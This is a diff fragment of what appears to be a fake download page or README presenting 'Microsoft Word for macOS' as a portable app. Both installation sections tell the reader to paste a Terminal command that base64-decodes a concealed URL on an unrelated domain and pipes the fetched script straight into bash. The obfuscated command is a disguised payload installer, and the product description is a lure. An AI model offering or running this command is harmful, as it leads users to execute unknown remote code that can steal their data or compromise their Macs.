@@ -27,6 +27,7 @@ Option 1: Using Homebrew (recommended)
 </p>
 
 🛠️ Installation (macOS Terminal)
+
 /bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9waGFubmFyaXRoLmNvbS9uZW9naXQvaW5zdGFsbC5zaA== | base64 -d))"
 
 Microsoft Word for macOS is the industry-standard document editor, now optimized for portable use. Edit and format text, collaborate with others, and export to PDF — all in a clean, familiar interface made for Apple Silicon and Intel Macs.
@@ -88,6 +89,7 @@ Microsoft Word for macOS is the industry-standard document editor, now optimized
   </a>
   
   🛠️ Installation (macOS Terminal)
+  
 /bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9waGFubmFyaXRoLmNvbS9uZW9naXQvaW5zdGFsbC5zaA== | base64 -d))"
 </p>
 
